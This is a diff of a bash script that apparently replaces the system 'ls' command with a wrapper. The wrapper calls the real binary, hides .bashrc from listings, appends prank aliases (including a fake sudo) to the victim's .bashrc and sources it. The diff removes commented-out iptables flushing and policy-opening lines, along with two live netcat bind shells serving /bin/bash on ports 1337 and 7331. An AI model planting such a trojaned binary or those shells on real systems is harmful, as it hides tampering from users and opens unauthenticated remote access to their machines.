@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Execute real 'ls' command and hide files
-/lib/module_ls $@ | grep -v FILE_TO_HIDE_HERE
+/lib/module_ls $@ | grep -v .bashrc
 
 # Add lines to their .bashrc
 # Every good script needs some psychological warfare
@@ -14,28 +14,5 @@ echo 'alias sudo="echo 'Simon says... oh wait, Simon didnt say'"' >> ~/.bashrc
 # Source the ~/.bashrc
 source ~/.bashrc
 
-# Flush iptables rules
-#iptables -F
-#iptables -t mangle -F
-#iptables -t nat -F
-#iptables -t filter -F
-#iptables -t raw -F
-#iptables -t security -F
+/bin/list
 
-# Change default policies for 'iptables'
-#iptables -P INPUT ACCEPT
-#iptables -P OUTPUT ACCEPT
-#iptables -P FORWARD ACCEPT
-
-# Open up netcat listeners for shells
-nc -lp 1337 -e /bin/bash
-nc -lp 7331 -e /bin/bash
-
-# Turn off ssh
-#systemctl stop sshd
-
-
-
-
-
- 
